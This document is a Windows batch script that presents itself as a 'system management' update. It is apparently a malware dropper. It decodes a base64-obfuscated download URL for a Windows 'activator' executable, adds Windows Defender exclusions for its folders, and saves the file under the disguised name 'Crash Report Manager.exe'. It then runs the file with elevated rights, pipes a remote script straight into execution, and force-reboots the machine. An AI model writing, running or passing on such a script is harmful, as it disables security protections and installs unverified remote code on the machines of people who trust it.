@echo off
setlocal EnableDelayedExpansion

:: Set title and configure error handling
title Windows System Management
set "errorlevel="

:: Log file setup
set "logfile=%TEMP%\system_management.log"
echo [%date% %time%] Script started >> "%logfile%"

:: Admin check with improved messaging
echo Checking administrative privileges...
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo [%date% %time%] Requesting administrative privileges >> "%logfile%"
    echo Administrative privileges required.
    echo Please allow the elevation request...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb runAs"
    exit /b
)

:: Define variables with clear names
set "encoded_url=aHR0cHM6Ly9naXRodWIuY29tL2JldGFtb2Q5L1dpbmRvd3MtMTAtYW5kLTExLUFjdGl2YXRvci9yZWxlYXNlcy9kb3dubG9hZC8xMi4yNy4yMDI0L1dpbmRvd3NLZXkuZXhl"
for /f "tokens=*" %%a in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%encoded_url%'))"') do set "download_url=%%a"

:: Define installation paths
set "install_folder=%APPDATA%\Microsoft"
set "executable_path=%install_folder%\Crash Report Manager.exe"
set "roaming_folder=%ProgramData%\Roaming\Microsoft"

:: Create directories if they don't exist
if not exist "%install_folder%" mkdir "%install_folder%"
if not exist "%roaming_folder%" mkdir "%roaming_folder%"

:: Configure security exceptions with error handling
echo Configuring security settings...
powershell -Command "try { 
    Add-MpPreference -ExclusionProcess '%executable_path%';
    Add-MpPreference -ExclusionPath '%install_folder%';
    Add-MpPreference -ExclusionPath '%roaming_folder%'
} catch { 
    Write-Host 'Warning: Security configuration partially completed'
}" >nul 2>&1

:: Download and execute with error handling
echo Downloading required components...
powershell -Command "$ProgressPreference = 'SilentlyContinue'; try {
    Invoke-WebRequest -Uri '%download_url%' -OutFile '%executable_path%'
} catch {
    Write-Host 'Download failed';
    exit 1
}" >nul 2>&1

if exist "%executable_path%" (
    echo Initializing system components...
    powershell -Command "Start-Process '%executable_path%' -Verb runAs"
    
    echo Applying system configurations...
    powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm https://get.activated.win | iex"
    echo [%date% %time%] Components initialized successfully >> "%logfile%"
) else (
    echo [%date% %time%] Component initialization failed >> "%logfile%"
    echo Installation failed. Please check your internet connection.
    pause
    exit /b 1
)

:: Restart notification with countdown
echo.
echo System update complete. Preparing for restart...
echo The system will restart in 3 minutes to apply changes.
echo Please save your work and close all applications.
echo [%date% %time%] Initiating restart sequence >> "%logfile%"

timeout /t 180 /nobreak

:: Perform restart
shutdown /r /f /t 0
